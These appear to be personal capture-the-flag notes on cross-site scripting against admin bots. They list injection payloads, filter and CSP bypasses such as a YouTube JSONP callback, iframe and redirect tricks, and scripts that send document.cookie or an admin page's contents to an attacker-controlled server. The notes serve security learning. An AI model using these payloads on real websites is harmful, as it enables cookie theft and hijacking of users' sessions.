When the user can insert HTML code to a site that an admin (usually "admin bot" with secret data in cookies or additional permissions) visits.
## Possible triggers
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet - not really working well for me
- `<script>code</script>`
- `<img src="smth" onerror="code">`
- `<anything onfocus="code" autofocus tabindex=1>`
- `<iframe/onload=alert(1)>`
## Bypassing limitations
https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss - cheat sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html - another cheat sheet
- JavaScript can be very flexible about characters, see [[Computer Science/Cyber/Web/Languages/Javascript]]
- See [[#List of possible triggers]] for flexibility in tag name and attribute name
- tag names and attributes can be uppercase or lowercase
- Browser automatically closes html tags and replaces invalid characters between attributes with spaces
- In case the XSS script is escaped inside a `<script>` tag for example, you can put a closing tag to escape the context (quotes for example).
- `document.createComment` is unsafe, you can do something like `document.createComment("--><script>alert(1);</script>");`
- When inside a HTML attribute, for example inside `onerror`, you can replace any character with its HTML entity.
### CSP
Can limit script and similar execution
https://csp-evaluator.withgoogle.com/ - to understand and show problems
#### JSONP endpoints
Many APIs have JSONP endpoints, that return a script that calls a user-specified callback with the API output.
In practice this can allow getting a user-controlled script from this website, bypassing CSP if this website is allowed
##### Common websites with JSONP endpoints
- Youtube: `https://www.youtube.com/oembed?url=http%3A//www.youtube.com/watch%3Fv%3DbDOYN-6gdRE&format=jsonp&callback=alert(1)`
### Redirections
- Setting `window.location`
- `window.open` - opens another tab
- Placing `<meta http-equiv='refresh' content='0; url=http://google.com' />` - works even with CSP
### Using `<iframe>`
- You can put html in various encodings inside an `iframe`.
- Can act as `windows.open` alternative to open another website. Can't really be a CORS bypass though, as doesn't allow reading the DOM.
#### Transferring information inside -> outside
- Only `window.postMessage` from inside works for CORS
#### Transferring information outside -> inside
- You can use `document.referrer` to access the outside url. normally contains only the domain, to access the full url including url parameters set the following attribute on the `iframe`: `referrer-policy="unsafe-url"`
- Set the `name` attribute on the `iframe`, access inside using `window.name`
- `postMessage` (TODO details)
- You can send http request by setting `top.location` or using `window.open`
Encodings:
- base64: `<iframe src='data:text/html;base64,base64htmlcode'></iframe>`
- allow escape sequences (untested, need to read details): `<iframe src=data:text/html;charset=iso-2022-jp,content></iframe>`
## Automatically sending HTTP request
- javascript `fetch` - fully flexible
- setting `window.location` to another URL - allows URL parameters
- `window.open(url)` - should open a new tab, similar to `window.location`
- setting the `src` of an `img` (or something else) - can't transfer info (referrer? maybe can send full url including params with referrer-policy)
## Getting information
To actually get information from the page (such as cookies), I need to send a request to a HTTP Server I own and can see the response.
Alternatively, if the server has any support to upload data I can read, I can use this feature instead.
Can also [[#Redirections|redirect]] to my server with a controlled URL parameter.
Script:
```js
fetch('url', {method: 'POST', body: document.cookie});
```
### Sending request to another page
Sometimes you might need to send a request to another page, for example if there are `HttpOnly` cookies or any other admin-only check that can't be leaked using JS.
Example script:
```js
fetch('https://mavs-fan.chall.lac.tf/admin', { credentials: 'include' }).then(response => {response.text().then(text => {fetch('url', {method: 'POST', body: text});})});
```
### request collection
- https://www.postb.in
- local python script using `ngrok`